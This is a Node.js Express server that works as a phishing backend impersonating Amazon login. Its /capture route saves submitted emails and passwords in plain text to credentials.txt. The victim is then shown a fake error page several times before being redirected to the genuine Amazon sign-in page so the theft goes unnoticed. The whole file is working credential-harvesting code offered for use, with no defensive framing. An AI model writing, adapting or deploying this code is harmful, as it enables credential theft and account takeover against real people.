const express = require('express'); // import express module
const fs = require('fs'); // import fs(file system) module to interact with file system in node.js
const path = require('path'); // import path module to manipulate file paths
const bodyParser = require('body-parser'); // import body parser module used to parse incoming requests in
// before the handlers, making it easier to work with the data sent in HTTP requests.
const cookieParser = require('cookie-parser'); // Add cookie-parser to handle cookies

const app = express();
const PORT = 3000;
const RELOAD_LIMIT = 3; // Number of reloads before redirecting to the actual site

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname)));
app.use(cookieParser()); // Use cookie-parser middleware

// Handle POST request to capture credentials
app.post('/capture', (req, res) => {
    const { username, password } = req.body;
    const data = `Email: ${username}, Password: ${password}\n`;

    // Save the credentials to a file
    fs.appendFile('credentials.txt', data, (err) => {
        if (err) {
            console.error('Failed to write to file', err);
            res.status(500).send('Server error');
        } else {
            console.log('Credentials captured');
            res.redirect('/error'); // Redirect to fake error page after capturing credentials
        }
    });
});

// Serve the fake error page with reload counter
app.get('/error', (req, res) => {
    let reloadCount = parseInt(req.cookies.reloadCount) || 0;

    if (reloadCount >= RELOAD_LIMIT) {
        // If the reload limit is reached, redirect to the actual amazon login site
        res.redirect('https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Flog%2Fs%3Fk%3Dlog%2Bin%26ref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0');
    } else {
        // Increment the reload count and set the cookie
        reloadCount++;
        res.cookie('reloadCount', reloadCount, { maxAge: 900000, httpOnly: true });
        //res.sendFile(path.join(__dirname, 'sdanlknjsaflndasf.html')); // Serve the fake error page
        res.sendFile(path.join(__dirname, 'fake-error.html')); // Serve the fake error page
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
